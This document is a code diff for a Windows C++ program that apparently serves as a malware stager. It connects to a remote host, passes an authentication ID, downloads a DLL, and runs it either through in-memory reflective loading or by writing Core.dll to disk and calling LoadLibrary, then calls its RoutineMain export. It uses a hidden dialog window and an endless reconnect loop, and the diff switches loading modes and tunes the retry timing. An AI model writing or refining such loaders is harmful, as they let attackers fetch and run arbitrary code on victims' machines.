@@ -1,5 +1,7 @@
 #include "stdafx.h"
+#include <tchar.h>
 #include <winsock2.h>
+
 #pragma comment (lib, "Ws2_32.lib")
 
 #if _MSC_VER < 1600
@@ -7,18 +9,16 @@
 #pragma comment(lib,"msvcrt.lib")
 #endif
 
-#include "MemLoadDll.h"
-#include <tchar.h>
+#define FILELOAD
 
 typedef struct _MsgHead
 {
 	int id;
 	int buflen;
 	DWORD lp;
-}Msghead, *LPMsghead;
+} Msghead, *LPMsghead;
 
 const int AuthId = 93226;
-const int BuffSize = 256 * 1024;
 
 struct DLL_INFO
 {
@@ -64,6 +64,61 @@ unsigned long WINAPI resolve(char *host)
 	return i = *(unsigned long *)ser->h_addr;
 }
 
+#ifndef FILELOAD
+
+#include "MemLoadDll.h"
+void loadDll(char* buf, int BuffSize)
+{
+	HMEMORYMODULE hModule = MemoryLoadLibrary(buf);
+
+	if (hModule == NULL)
+	{
+		MsgErr(_T("Load Dll Err"));
+		VirtualFree(buf, BuffSize);
+
+		return;
+	}
+
+	typedef BOOL(*_RoutineMain)(LPVOID);
+	_RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
+
+	RoutineMain(&SysInfo);
+
+	MemoryFreeLibrary(hModule);
+}
+
+#else
+
+void loadDll(char* buf, int BuffSize)
+{
+	const TCHAR DllName[] = _T("Core.dll");
+
+	HANDLE h = CreateFile(DllName, GENERIC_ALL, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	bool result = WriteFile(h, buf, BuffSize, NULL, NULL);
+	CloseHandle(h);
+
+	if(result)
+	{
+		HMODULE hModule = LoadLibrary(DllName);
+
+		if (hModule == NULL)
+		{
+			MsgErr(_T("Load Dll Err"));
+
+			return;
+		}
+
+		typedef BOOL(*_RoutineMain)(LPVOID);
+		_RoutineMain RoutineMain = (_RoutineMain)GetProcAddress(hModule, "RoutineMain");
+
+		RoutineMain(&SysInfo);
+
+		FreeLibrary(hModule);
+	}
+}
+
+#endif // !FILELOAD
+
 DWORD _stdcall ConnectThread(LPVOID lParam)
 {
 	SOCKET h = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
@@ -76,7 +131,6 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	if (connect(h, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR)
 	{
 		MsgErr("Connect Error");
-		Sleep(1000 * 10);
 		return 0;
 	}
 
@@ -94,7 +148,9 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 		return 0;
 	}
 
+	int BuffSize = lp.buflen;
 	char *buf = (char *)VirtualAlloc(BuffSize);
+
 	char *lpbuf = buf;
 	int leftlen = lp.buflen;
 
@@ -107,6 +163,7 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 			VirtualFree(buf, BuffSize);
 			shutdown(h, 0);
 			closesocket(h);
+
 			MsgErr(_T("Recv Loop Err"));
 			return 0;
 		}
@@ -118,30 +175,12 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 	shutdown(h, 0);
 	closesocket(h);
 
-	HMEMORYMODULE hModule = MemoryLoadLibrary(buf);
-
-	if (hModule == NULL)
-	{
-		MsgErr(_T("Load Dll Err"));
-		VirtualFree(buf, BuffSize);
-
-		return 0;
-	}
-
-	typedef BOOL(*_RoutineMain)(LPVOID);
-	_RoutineMain RoutineMain = (_RoutineMain)MemoryGetProcAddress(hModule, "RoutineMain");
-
-	RoutineMain(&SysInfo);
-
-	MemoryFreeLibrary(hModule);
+	loadDll(buf, BuffSize);
 
 	return 0;
 }
 
-int APIENTRY WinMain(HINSTANCE hInstance,
-	HINSTANCE hPrevInstance,
-	LPSTR     lpCmdLine,
-	int       nCmdShow)
+int WINAPI _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)
 {
 	HWND hwnd = CreateWindowExW(WS_EX_APPWINDOW,
 		L"#32770",
@@ -162,8 +201,6 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 
 	GetInputState(); //-V530
 	PostThreadMessage(GetCurrentThreadId(), NULL, 0, 0);
-	MSG	msg;
-	GetMessage(&msg, NULL, NULL, NULL);
 
 	WSADATA lpWSAData;
 	WSAStartup(MAKEWORD(2, 2), &lpWSAData);
@@ -176,9 +213,9 @@ int APIENTRY WinMain(HINSTANCE hInstance,
 		}
 		__except (1)
 		{
-			MsgErr(_T("Sys Err"));
+			MsgErr(_T("ConnectThread Error"));
 		}
 
-		Sleep(500);
+		Sleep(3000);
 	}
 }
